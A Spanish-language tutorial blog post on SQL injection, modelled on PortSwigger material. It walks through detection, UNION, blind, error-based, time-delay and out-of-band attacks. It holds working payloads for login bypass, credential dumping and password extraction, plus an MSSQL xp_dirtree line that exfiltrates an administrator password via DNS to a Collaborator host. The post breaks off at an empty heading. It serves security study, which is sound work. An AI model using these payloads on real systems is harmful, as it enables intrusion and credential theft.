---
title: SQLI guide
description: Guía sobre SQLI
date: 2025-07-21 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Guides
tags:
  - Portswigger Guides 
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de la vulnerabilidad SQLI`. Detallamos cómo `identificar` y `explotar` esta vulnerabilidad, tanto `manualmente` como con `herramientas automatizadas`. Además, exploramos `estrategias clave para prevenirla`, incluyendo el uso de `consultas parametrizadas` y `buenas prácticas de seguridad`

---

## ¿Qué es una SQL injection?

La `SQL injection (SQLi)` es una `vulnerabilidad de seguridad web` que permite a un atacante `interferir con las consultas` que una aplicación realiza a su `base de datos`. Esto puede permitir que un atacante `vea datos` que normalmente no debería poder recuperar, lo que podría incluir `datos que pertenecen a otros usuarios` o cualquier otro dato al que la aplicación tenga acceso

En muchos casos, un atacante puede `modificar` o `eliminar` estos `datos`, causando `cambios persistentes` en el `contenido` o el `comportamiento` de la `aplicación`. Hay casos en los que un atacante puede `escalar` un `ataque de SQL injection` para `comprometer` el `servidor subyacente` u otra `infraestructura de backend`. Además de esto, también puede permitirles realizar `ataques de denegación de servicio`

## ¿Cuál es el impacto de un ataque de SQL injection exitoso?

Un ataque de `SQL injection` exitoso puede provocar un `acceso no autorizado` a `datos confidenciales`, como:

- `Contraseñas`

- `Datos de tarjetas de crédito`

- `Información personal de los usuarios`

Los ataques de `SQL injection` se han utilizado en numerosas `filtraciones de datos de alto perfil` a lo largo de los años. Estas han provocado `daños reputacionales` y `multas por parte de organismos reguladores`. En algunos casos, un atacante puede obtener un `backdoor persistente` en los `sistemas de una organización`, lo que puede provocar un `compromiso a largo plazo` que podría `pasar desapercibido durante un período prolongado`

## ¿Cómo detectar una SQL injection?

Podemos detectar manualmente una `SQL injection` utilizando un `conjunto sistemático de pruebas` contra cada `punto de entrada` de la aplicación. Para ello, normalmente enviaríamos:

- El carácter de comilla simple `'` y buscaríamos `errores` u otras `anomalías`

- Alguna `sintaxis específica de SQL` que se evalúe como el `valor base (original)` del `punto de entrada` y otra que se evalúe como un `valor diferente`, buscando `diferencias en las respuestas` de la aplicación

- `Condiciones booleanas` como `OR 1=1` y `OR 1=2`, y buscaríamos `diferencias en las respuestas` de la aplicación

- `Payloads` diseñados para provocar un `timeout` al ejecutarse dentro de una `consulta SQL`, y buscaríamos `diferencias en el tiempo` que tarda la aplicación en responder

- `Payloads OAST` diseñados para provocar una `interacción out-of-band` al ejecutarse dentro de una `consulta SQL`, monitorizando cualquier `interacción resultante`

Como alternativa, podemos encontrar la mayoría de las `vulnerabilidades de SQL injection` de forma `rápida` y `fiable` utilizando el `escáner de Burpsuite`

## SQL injection en diferentes partes de la consulta

La mayoría de las `vulnerabilidades de SQL injection` ocurren dentro de la cláusula `WHERE` de una consulta `SELECT`, sin embargo, las `vulnerabilidades de SQL injection` pueden ocurrir en `cualquier parte de la consulta` y dentro de `diferentes tipos de consultas`. Algunas otras `ubicaciones comunes` donde surgen `SQL injections` son:

- En sentencias `UPDATE`, dentro de los `valores actualizados` o en la cláusula `WHERE`
  
- En sentencias `INSERT`, dentro de los `valores insertados`
  
- En sentencias `SELECT`, dentro del `nombre de la tabla` o `nombre de la columna`
  
- En sentencias `SELECT`, dentro de la cláusula `ORDER BY`

## Ejemplos de SQL injection

Existen muchas `vulnerabilidades`, `ataques` y `técnicas de SQL injection` que se producen en diferentes situaciones. Algunos `ejemplos comunes de SQL injection` incluyen:

- `Obtener datos ocultos` - Donde podemos modificar una `consulta SQL` para que devuelva `resultados adicionales`

- `Alteración de la lógica de la aplicación` - Donde podemos modificar una consulta para `interferir con la lógica de la aplicación`

- `Ataques UNION` - Donde odemos obtener `datos de diferentes tablas` de la base de datos

- `Blind SQL injection` - Donde los resultados de una consulta que controlamos `no se devuelven en las respuestas de la aplicación`

### Obtención de datos ocultos

Imaginemos una `aplicación de compras` que muestra `productos` de diferentes `categorías`. Cuando el usuario hace `click` en la categoría `Regalos`, su navegador solicita la siguiente `URL`:

```
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación ejecute una `consulta SQL` para obtener de la `base de datos` los `detalles de los productos` correspondientes:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta `consulta SQL` solicita a la `base de datos` que devuelva:

- Todos los detalles (`*`)

- De la tabla `products`

- Donde `category` sea `Gifts`

- Y `released` sea `1`

La condición `released = 1` se utiliza para `ocultar los productos` que todavía no han sido publicados. Podemos asumir que, para los productos que aún no se han publicado, `released = 0`

La aplicación no implementa ninguna `defensa contra ataques de SQL injection`. Esto significa que un atacante podría realizar, por ejemplo, el siguiente ataque:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto da como resultado la siguiente `consulta SQL`:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Es importante observar que `--` es un `indicador de comentario en SQL`. Esto significa que el resto de la consulta se interpreta como un `comentario` y, en la práctica, queda `eliminado`

En este ejemplo, esto significa que la consulta ya no contiene `AND released = 1`. Como resultado, se muestran `todos los productos`, incluidos aquellos que todavía no han sido publicados

Podemos utilizar un `ataque similar` para hacer que la aplicación muestre `todos los productos` de cualquier categoría, incluso de categorías que el usuario no conoce:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Esto da como resultado la siguiente `consulta SQL`:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

La `consulta modificada` devuelve todos los elementos en los que se cumpla alguna de estas condiciones:

- `category` sea `Gifts`

- `1` sea igual a `1`

Como `1=1` **siempre es verdadero**, la consulta devuelve `todos los elementos`

Debemos tener cuidado al inyectar la condición `OR 1=1` en una `consulta SQL`. Aunque pueda parecer inofensiva en el contexto en el que la estamos inyectando, es habitual que las aplicaciones utilicen los `datos de una misma petición` en `varias consultas diferentes`

Por ejemplo, si nuestracondición llega a una sentencia `UPDATE` o `DELETE`, podría provocar una `pérdida accidental de datos`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data - [https://justice-reaper.github.io/posts/SQLI-Lab-1/](https://justice-reaper.github.io/posts/SQLI-Lab-1/)

### Alteración de la lógica de la aplicación

Imaginemos una aplicación que permite a los usuarios `iniciar sesión` con un `nombre de usuario` y una `contraseña`. Si un usuario introduce el nombre de usuario `wiener` y la contraseña `bluecheese`, la aplicación comprueba las `credenciales` ejecutando la siguiente `consulta SQL`:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Si la consulta devuelve los `datos de un usuario`, el `inicio de sesión` tiene éxito. De lo contrario, se rechaza

En este caso, un atacante puede `iniciar sesión como cualquier usuario` sin necesidad de conocer su contraseña. Puede hacerlo utilizando la secuencia de comentario SQL `--` para eliminar la `comprobación de la contraseña` de la cláusula `WHERE`

Por ejemplo, introducir el nombre de usuario `administrator'--` y dejar la contraseña en blanco da como resultado la siguiente `consulta`:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Esta consulta devuelve al usuario cuyo `username` es `administrator` y permite al atacante `iniciar sesión correctamente` como ese usuario

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection vulnerability allowing login bypass - [https://justice-reaper.github.io/posts/SQLI-Lab-2/](https://justice-reaper.github.io/posts/SQLI-Lab-2/)

### Obtención de datos de otras tablas de la base de datos

En los casos en los que la aplicación responde mostrando los `resultados de una consulta SQL`, un atacante puede aprovechar una `vulnerabilidad de SQL injection` para obtener `datos de otras tablas` dentro de la base de datos

Podemos utilizar la palabra clave `UNION` para ejecutar una consulta `SELECT` adicional y añadir sus resultados a los `resultados de la consulta original`

Por ejemplo, si una aplicación ejecuta la siguiente consulta que contiene la entrada proporcionada por el usuario `Gifts`:

```
SELECT name, description FROM products WHERE category = 'Gifts'
```

Un atacante puede introducir:

```
' UNION SELECT username, password FROM users--
```

Esto hace que la aplicación devuelva todos los `nombres de usuario` y `contraseñas`, junto con los `nombres` y las `descripciones de los productos`

### Ataques de SQL injection mediante UNION

Cuando una aplicación es vulnerable a `SQL injection` y los `resultados de la consulta` se devuelven dentro de las respuestas de la aplicación, podemos utilizar la palabra clave `UNION` para obtener `datos de otras tablas` de la base de datos. Esto se conoce comúnmente como `SQL injection UNION attack`

La palabra clave `UNION` permite ejecutar una o más consultas `SELECT` adicionales y añadir sus resultados a los de la `consulta original`. Por ejemplo:

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Esta `consulta SQL` devuelve un único `conjunto de resultados` con dos columnas, que contiene los valores de las columnas `a` y `b` de `table1` y de las columnas `c` y `d` de `table2`

Para que una consulta `UNION` funcione, deben cumplirse `dos requisitos fundamentales`:

- Las `consultas individuales` deben devolver el `mismo número de columnas`

- Los `tipos de datos de cada columna` deben ser `compatibles` entre las diferentes consultas    

Para realizar un ataque de `SQL injection` mediante `UNION`, debemos asegurarnos de que el ataque cumple estos `dos requisitos`. Normalmente, esto implica averiguar:

- `Cuántas columnas devuelve la consulta original`

- `Qué columnas` devueltas por la consulta original tienen un `tipo de datos adecuado` para contener los `resultados de la consulta inyectada`

#### Determinar el número de columnas necesarias

Cuando realizamos un ataque de `SQL injection` mediante `UNION`, existen `dos métodos eficaces` para determinar `cuántas columnas` se están devolviendo de la consulta original

Un método consiste en inyectar una serie de cláusulas `ORDER BY` e incrementar el `índice de columna` especificado hasta que se produzca un `error`. Por ejemplo, si el `punto de inyección` es una `cadena entre comillas` dentro de la cláusula `WHERE` de la consulta original, enviaremos:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Esta serie de `payloads` modifica la consulta original para ordenar los resultados por `diferentes columnas` del conjunto de resultados. La columna de una cláusula `ORDER BY` puede especificarse mediante su `índice`, por lo que no necesitamos conocer los `nombres de ninguna columna`. Cuando el `índice de columna` especificado supera el `número de columnas reales` del conjunto de resultados, la base de datos devuelve un `error`, como:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

La aplicación podría devolver realmente el `error de la base de datos` en su `respuesta HTTP`, pero también podría emitir una `respuesta de error genérica`. En otros casos, simplemente podría `no devolver ningún resultado`. En cualquier caso, siempre que podamos detectar alguna `diferencia en la respuesta`, podemos inferir `cuántas columnas` se están devolviendo de la consulta

El segundo método consiste en enviar una serie de payloads `UNION SELECT` especificando un número diferente de valores `null`:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

Si el número de valores `null` no coincide con el `número de columnas`, la base de datos devolverá un `error` como este:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Utilizamos `NULL` como los valores devueltos por la consulta `SELECT` inyectada porque los `tipos de datos de cada columna` deben ser `compatibles` entre las consultas original e inyectada. `NULL` se puede convertir a `todos los tipos de datos comunes`, por lo que maximiza la posibilidad de que el `payload` tenga éxito cuando el `número de columnas` sea correcto

Al igual que con la técnica `ORDER BY`, la aplicación podría devolver realmente el `error de la base de datos` en su `respuesta HTTP`, pero podría devolver un `error genérico` o simplemente `no devolver ningún resultado`. Cuando el número de valores `null` coincide con el `número de columnas`, la base de datos devuelve una `fila adicional` en el conjunto de resultados, que contiene `valores null` en cada columna. El efecto sobre la `respuesta HTTP` depende del código de la aplicación. Si tenemos suerte, veremos `contenido adicional` dentro de la respuesta, como una `fila adicional en una tabla HTML`. De lo contrario, los `valores null` podrían provocar un `error diferente`, como un `NullPointerException`. En el peor de los casos, la respuesta podría parecerse a una respuesta causada por un `número incorrecto de valores null`. Esto haría que este método fuera `ineficaz`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection UNION attack, determining the number of columns returned by the query - [https://justice-reaper.github.io/posts/SQLI-Lab-7/](https://justice-reaper.github.io/posts/SQLI-Lab-7/)

#### Sintaxis específica de la base de datos

En `Oracle`, toda consulta `SELECT` debe utilizar la palabra clave `FROM` y especificar una `tabla válida`. `Oracle` dispone de una tabla integrada llamada `dual` que puede utilizarse con este propósito. Por lo tanto, las `consultas inyectadas` en `Oracle` tendrían que tener este aspecto:

```
' UNION SELECT NULL FROM DUAL--
```

Los `payloads` descritos utilizan la secuencia de comentario de doble guion `--` para comentar el resto de la consulta original que sigue al `punto de inyección`. En `MySQL`, la secuencia de doble guion debe ir seguida de un `espacio`. Como alternativa, se puede utilizar el carácter almohadilla `#` para identificar un `comentario`

#### Encontrar columnas con un tipo de datos útil

Un ataque de `SQL injection` mediante `UNION` nos permite recuperar los `resultados de una consulta inyectada`. Los `datos interesantes` que queremos recuperar normalmente son `cadenas de texto`. Esto significa que necesitamos encontrar una o más columnas en los resultados de la consulta original cuyo `tipo de dato` sea `string` o sea compatible con `datos de tipo string`

Después de determinar el `número de columnas necesarias`, podemos probar cada columna para comprobar si puede contener `datos de tipo string`. Podemos enviar una serie de payloads `UNION SELECT` que coloquen una `cadena de texto` en cada columna (probamos las posiciones de una en una). Por ejemplo, si la consulta devuelve `cuatro columnas`, enviaríamos:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Si el `tipo de datos de la columna` no es compatible con `datos de tipo string`, la consulta inyectada provocará un `error de la base de datos`, como este:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

Si no se produce ningún `error` y la respuesta de la aplicación contiene `contenido adicional` que incluye el `valor de cadena inyectado`, entonces la columna correspondiente es adecuada para recuperar `datos de tipo string`

En estos `laboratorios` podemos ver un `ejemplo` de `esto`:

- SQL injection UNION attack, finding a column containing text - [https://justice-reaper.github.io/posts/SQLI-Lab-8/](https://justice-reaper.github.io/posts/SQLI-Lab-8/)

#### Utilizar un ataque de SQL injection mediante UNION para recuperar datos interesantes

Cuando hayamos determinado el `número de columnas devueltas` por la consulta original y hayamos encontrado qué columnas pueden contener `datos de tipo cadena`, estaremos en condiciones de recuperar `datos interesantes`

Supongamos que:

- La consulta original devuelve `dos columnas`, y ambas pueden contener `datos de tipo string`

- El `punto de inyección` es una cadena  de texto entre comillas dentro de la cláusula `WHERE`

- La base de datos contiene una tabla llamada `users` con las columnas `username` y `password`

En este ejemplo, podemos recuperar el contenido de la tabla `users` así:

```
' UNION SELECT username, password FROM users--
```

Para realizar este ataque, necesitamos saber que existe una tabla llamada `users` con dos columnas llamadas `username` y `password`. Sin esta información, tendríamos que `adivinar los nombres de las tablas y las columnas`. Todas las bases de datos modernas proporcionan formas de `examinar la estructura de la base de datos` y determinar qué `tablas y columnas` contienen

En estos `laboratorios` podemos ver un `ejemplo` de `esto`:

- SQL injection UNION attack, retrieving data from other tables - [https://justice-reaper.github.io/posts/SQLI-Lab-9/](https://justice-reaper.github.io/posts/SQLI-Lab-9/)

#### Recuperar varios valores dentro de una sola columna

En algunos casos, la consulta del ejemplo anterior puede devolver únicamente `una columna`. Podemos recuperar `varios valores` juntos dentro de esta única columna `concatenando los valores`. Podemos incluir un `separador` para poder distinguir los valores combinados. Por ejemplo, en `Oracle` podrías enviar la entrada:

```
' UNION SELECT username || '~' || password FROM users--
```

Esto utiliza la secuencia de doble barra vertical `||`, que es un `operador de concatenación de cadenas` en `Oracle`. La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`

Los resultados de la consulta contienen todos los `nombres de usuario` y `contraseñas`, por ejemplo:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Diferentes bases de datos utilizan una `sintaxis diferente` para realizar la `concatenación de cadenas`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection UNION attack, retrieving multiple values in a single column - [https://justice-reaper.github.io/posts/SQLI-Lab-10/](https://justice-reaper.github.io/posts/SQLI-Lab-10/)

### Vulnerabilidades de blind SQL injection

Muchos casos de `SQL injection` son `blind SQL injections`. Esto significa que la aplicación no devuelve los `resultados de la consulta SQL` ni los detalles de los `posibles errores de la base de datos` en sus respuestas

Las `blind SQL injections` todavía pueden explotarse para acceder a `datos no autorizados`, pero las `técnicas utilizadas` suelen ser más complejas y difíciles de llevar a cabo

Las siguientes técnicas pueden utilizarse para explotar `vulnerabilidades de blind SQL injection`, dependiendo de la `naturaleza de la vulnerabilidad` y de la `base de datos implicada`:

- Modificar la `lógica de la consulta` para provocar una `diferencia detectable` en la respuesta de la aplicación dependiendo de si una determinada condición es `verdadera` o `falsa`. Esto puede implicar inyectar una `nueva condición` dentro de una `lógica booleana` o provocar condicionalmente un `error`, como una `división entre cero`

- Provocar condicionalmente un `timeout` durante el `procesamiento de la consulta`. Esto permite determinar si una condición es `verdadera` basándose en el `tiempo que tarda la aplicación en responder`

- Provocar una `interacción out-of-band`. Esta técnica es `extremadamente potente` y funciona en situaciones en las que las técnicas anteriores no funcionan. A menudo, es posible `extraer directamente los datos` a través del `canal out-of-band`. Por ejemplo, se pueden introducir los datos en una `consulta DNS` dirigida a un `dominio que esté bajo nuestro control`

#### ¿Qué es una blind SQL injection?

Una `blind SQL injection` ocurre cuando una aplicación es vulnerable a `SQL injection` pero sus `respuestas HTTP` no contienen los `resultados de la consulta SQL` correspondiente ni los detalles de ningún `error de la base de datos`

Muchas técnicas, como los `ataques de SQL injection mediante UNION`, no son eficaces frente a una `blind SQL injection`. Esto se debe a que dependen de poder ver los `resultados de la consulta inyectada` dentro de las respuestas de la aplicación. Sigue siendo posible explotar una `blind SQL injection` para acceder a `datos no autorizados`, pero deben utilizarse `técnicas diferentes`

#### Explotar una blind SQL injection provocando respuestas condicionales

Consideremos una aplicación que utiliza `cookies de seguimiento` para recopilar `análisis sobre el uso`. Las solicitudes a la aplicación incluyen una `cabecera de cookie` como esta:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Cuando se procesa una solicitud que contiene una cookie `TrackingId`, la aplicación utiliza una `consulta SQL` para determinar si se trata de un `usuario conocido`:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a la `SQL injection`, pero los `resultados de la consulta` no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta `devuelve algún dato`. Si enviamos un `TrackingId` reconocido, la consulta devuelve datos y recibimos un mensaje de `"Welcome back"` en la respuesta

Este comportamiento es suficiente para poder explotar la `blind SQL injection`. Podemos recuperar información provocando `diferentes respuestas de forma condicional`, dependiendo de una `condición inyectada`

Para entender cómo funciona esto, supongamos que se envían `dos solicitudes` que contienen los siguientes valores de cookie `TrackingId`, respectivamente:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- El primero de estos valores hace que la consulta `devuelva resultados`, porque la condición inyectada `AND '1'='1` es `verdadera`. Como resultado, se muestra el mensaje `"Welcome back"`

- El segundo valor hace que la consulta `no devuelva ningún resultado`, porque la condición inyectada es `falsa` y por lo tanto, el mensaje `"Welcome back"` no se muestra

Esto nos permite determinar la respuesta a cualquier `condición individual inyectada` y `extraer los datos`

Por ejemplo, supongamos que existe una tabla llamada `Users` con las columnas `Username` y `Password`, y un usuario llamado `Administrator`. Podemos determinar la contraseña de este usuario enviando una serie de `inputs` para obtener la contraseña `caracter a caracter`

Para hacerlo, enviamos lo siguiente:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Esto devuelve el mensaje `"Welcome back"`, indicando que la condición inyectada es `verdadera` y, por lo tanto, que el `primer carácter de la contraseña` es mayor que `m`

A continuación, enviamos lo siguiente:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Esto no devuelve el mensaje `"Welcome back"`, indicando que la condición inyectada es `falsa` y, por lo tanto, que el `primer carácter de la contraseña` no es mayor que `t`

Finalmente, enviamos esto, que devuelve el mensaje `"Welcome back"`, confirmando así que el `primer carácter de la contraseña` es la letra `s`

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Podemos continuar con este proceso para determinar sistemáticamente la `contraseña completa` del usuario `Administrator`

La función `SUBSTRING` se denomina `SUBSTR` en algunos tipos de bases de datos. Para obtener más información acerca de esto, podemos consultar la `cheatsheet de portswigger` sobre SQLI [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- Blind SQL injection with conditional responses - [https://justice-reaper.github.io/posts/SQLI-Lab-11/](https://justice-reaper.github.io/posts/SQLI-Lab-11/)

#### Error-based SQL injection

La `SQL injection basada en errores` hace referencia a los casos en los que puedes utilizar `mensajes de error` para `extraer` o `inferir datos confidenciales` de la base de datos, incluso en contextos donde se da una `blind SQL injection`. Las posibilidades dependen de la `configuración de la base de datos` y de los `tipos de errores` que podamos provocar:

- Es posible que podamos hacer que la aplicación devuelva una `respuesta de error específica` en función del resultado de una `expresión booleana`. Podemos explotar esto de la misma manera que las `respuestas condicionales` de la sección anterior

- Es posible que podamos provocar `mensajes de error` que muestren los `datos devueltos por la consulta`. Esto convierte efectivamente las `vulnerabilidades de SQL injection` que de otro modo serían `blind` en `vulnerabilidades visibles`

#### Explotar la blind SQL injection provocando errores condicionales

Algunas aplicaciones realizan `consultas SQL`, pero su comportamiento `no cambia`, independientemente de si la consulta devuelve algún dato. La técnica de la sección anterior no funcionará, porque inyectar `diferentes condiciones booleanas` no produce ninguna `diferencia en las respuestas de la aplicación`

A menudo es posible hacer que la aplicación devuelva una `respuesta diferente` dependiendo de si se produce un `error SQL`. Podemos modificar la consulta para que provoque un `error de la base de datos` únicamente si la condición es `verdadera`. Muy a menudo, un `error no gestionado` provocado por la base de datos causa alguna `diferencia en la respuesta de la aplicación`, como un `mensaje de error`. Esto permite inferir si la `condición inyectada` es `verdadera`

Para ver cómo funciona esto, supongamos que se envían `dos solicitudes` que contienen, respectivamente, los siguientes valores de cookie `TrackingId`:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```


```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Estas `payloads` utilizan la palabra clave `CASE` para comprobar una condición y devolver una `expresión diferente` dependiendo de si la expresión es `verdadera`:

- Con el primer `payload`, la expresión `CASE` se evalúa como `'a'`, lo que `no provoca ningún error`

- Con el segundo `payload`, se evalúa como `1/0`, lo que provoca un `error de división entre cero`

Si el `error` provoca una `diferencia en la respuesta HTTP` de la aplicación, podemos utilizar esto para determinar si la `condición inyectada` es `verdadera`

Utilizando esta técnica, podemos recuperar `datos` comprobando un `carácter` cada vez:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- Blind SQL injection with conditional errors - [https://justice-reaper.github.io/posts/SQLI-Lab-12/](https://justice-reaper.github.io/posts/SQLI-Lab-12/)

#### Extraer datos confidenciales mediante mensajes de error SQL detallados

Una `configuración incorrecta de la base de datos` a veces da lugar a `mensajes de error detallados`. Estos pueden proporcionar `información` que puede resultar útil para un atacante. Por ejemplo, consideremos el siguiente `mensaje de error`, que aparece después de inyectar una `comilla simple` en un parámetro `id`:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Esto muestra la `consulta completa` que la aplicación construyó utilizando nuestro `input`. Podemos ver que, en este caso, estamos inyectando dentro de una `cadena de texto` que está entre `comillas simples` en una sentencia `WHERE`. Esto facilita la construcción de una `consulta válida` que contenga un `payload malicioso`. Comentar el resto de la consulta evitaría que la `comilla simple sobrante` rompiera la `sintaxis`

En ocasiones, podemos conseguir que la aplicación genere un `mensaje de error` que contenga algunos de los `datos devueltos por la consulta`. Esto convierte efectivamente una `vulnerabilidad de SQL injection` que de otro modo sería `blind`, en una `vulnerabilidad visible`

Podemos utilizar la función `CAST()` para conseguirlo. Esta función permite convertir un `tipo de datos` en otro. Por ejemplo, imaginemos una consulta que contiene la siguiente sentencia:

```
CAST((SELECT example_column FROM example_table) AS int)
```

A menudo, los datos que intentamos leer son una `cadena de texto`. Intentar convertirla a un `tipo de datos incompatible` como un `int`, puede provocar un `error` similar al siguiente:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Este tipo de consulta también puede resultar útil si un `límite de caracteres` nos impide provocar `respuestas condicionales`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- Visible error-based SQL injection - [https://justice-reaper.github.io/posts/SQLI-Lab-13/](https://justice-reaper.github.io/posts/SQLI-Lab-13/)

#### Explotar una blind SQL injection provocando un delay

Si la aplicación captura los `errores de la base de datos` cuando se ejecuta la `consulta SQL` y los gestiona correctamente, no habrá ninguna `diferencia en la respuesta de la aplicación`. Esto significa que la técnica anterior para provocar `errores condicionales` no funcionará

En esta situación, a menudo es posible explotar la `blind SQL injection` provocando un `delay` dependiendo de si una `condición inyectada` es `verdadera` o `falsa`. Como las `consultas SQL` normalmente son procesadas de forma síncrona por la aplicación, retrasar la ejecución de una consulta SQL también retrasa la `respuesta HTTP`. Esto permite determinar si la `condición inyectada` es `verdadera` basándose en el `tiempo que se tarda en recibir la respuesta HTTP`

Las técnicas para provocar un `retraso de tiempo` son específicas del `tipo de base de datos` que se está utilizando. Por ejemplo, en `Microsoft SQL Server`, podemos utilizar lo siguiente para comprobar una condición y provocar un `delay` dependiendo de si la expresión es `verdadera`:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- La primera instruccióon no provoca ningún `delay`, porque la condición `1=2` es `falsa`

- La segunda instrucción provoca un `delay de 10 segundos`, porque la condición `1=1` es `verdadera`

Utilizando esta técnica, podemos recuperar `datos` comprobando un `carácter` cada vez:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

En estos `laboratorios` podemos ver un `ejemplo` de `esto`:

- Blind SQL injection with time delays - [https://justice-reaper.github.io/posts/SQLI-Lab-14/](https://justice-reaper.github.io/posts/SQLI-Lab-14/)

- Blind SQL injection with time delays and information retrieval - [https://justice-reaper.github.io/posts/SQLI-Lab-15/](https://justice-reaper.github.io/posts/SQLI-Lab-15/)

#### Explotar una blind SQL injection utilizando técnicas out-of-band (OAST)

Una aplicación podría realizar la misma `consulta SQL` que en el ejemplo anterior, pero hacerlo de forma `asíncrona`. La aplicación continúa procesando la solicitud del usuario en el `hilo original` y utiliza `otro hilo` para ejecutar una `consulta SQL` utilizando la `cookie de seguimiento`. La consulta sigue siendo vulnerable a la `SQL injection`, pero ninguna de las técnicas descritas hasta ahora funcionará. La respuesta de la aplicación no depende de que la consulta `devuelva algún dato`, de que se produzca un `error de la base de datos` ni del `tiempo que tarde en ejecutarse la consulta`

En esta situación, a menudo es posible explotar la `blind SQL injection` provocando `interacciones out-of-band` con un `sistema que controlamos`. Estas pueden provocarse en función de una `condición inyectada` para `inferir información por partes`

Se puede utilizar una variedad de `protocolos de red` para este propósito, pero normalmente el más eficaz es `DNS (domain name service)`. Muchas redes de producción permiten libremente la salida de `consultas DNS`, porque son esenciales para el funcionamiento normal de los `sistemas de producción`

La herramienta más sencilla y fiable para utilizar `técnicas out-of-band` es  `Burpsuite Collaborator`. Este es un servidor que proporciona `implementaciones personalizadas` de varios `servicios de red`, incluido `DNS`. Permite detectar cuándo se producen `interacciones de red` como resultado del envío de `payloads individuales` a una `aplicación vulnerable`

Las técnicas para provocar una `consulta DNS` son específicas del `tipo de base de datos` que se está utilizando. Por ejemplo, la siguiente entrada en `Microsoft SQL Server` puede utilizarse para provocar una `búsqueda DNS` en un `dominio especificado`:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Esto hace que la base de datos realice una `búsqueda del siguiente dominio`:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Podemos utilizador `Burpsuite Collaborator` para generar un `subdominio único` y consultar la `pestaña Collaborator` para confirmar cuándo se produce alguna `búsqueda DNS`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- Blind SQL injection with out-of-band interaction - [https://justice-reaper.github.io/posts/SQLI-Lab-16/](https://justice-reaper.github.io/posts/SQLI-Lab-16/)

Una vez confirmado un método para provocar `interacciones out-of-band`, podemos utilizar el `canal out-of-band` para `extraer datos` de la `aplicación vulnerable`. Por ejemplo:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Esta `payload` lo que hace es leer la `contraseña` del usuario `Administrator`, añadir un `subdominio único` de `Burpsuite Collaborator` y provocar una `búsqueda DNS`. Esta búsqueda nos permite ver la `contraseña capturada`:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Las `técnicas out-of-band (OAST)` son una forma eficaz de detectar y explotar una `blind SQL injection`, debido a la `alta probabilidad de éxito` y a la capacidad de `extraer directamente los datos` dentro del `canal fuera de banda`. Por este motivo, las `técnicas OAST` suelen ser preferibles incluso en situaciones en las que otras técnicas para explotar `blind SQL injections` sí funcionan

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- Blind SQL injection with out-of-band data exfiltration - [https://justice-reaper.github.io/posts/SQLI-Lab-17/](https://justice-reaper.github.io/posts/SQLI-Lab-17/)

### SQL injection de segundo orden

